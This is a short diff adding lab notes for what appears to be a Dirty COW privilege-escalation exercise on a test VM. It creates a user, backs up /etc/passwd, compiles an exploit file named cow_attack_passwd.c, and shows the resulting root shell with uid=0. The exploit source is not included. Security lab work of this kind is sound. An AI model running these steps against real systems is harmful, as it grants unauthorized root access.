@@ -1,0 +1,16 @@
+sudo adduser charlie
+
+cat /etc/passwd | grep charlie
+
+## Backup del file /etc/passwd
+sudo cp passwd passwd.bak
+
+gcc cow_attack_passwd.c -o attack1 -lpthread
+
+su charlie
+
+root@osboxes:/home/osboxes/Desktop/dirty_cow# id
+uid=0(root) gid=1001(charlie) groups=0(root),1001(charlie)
+
+
+
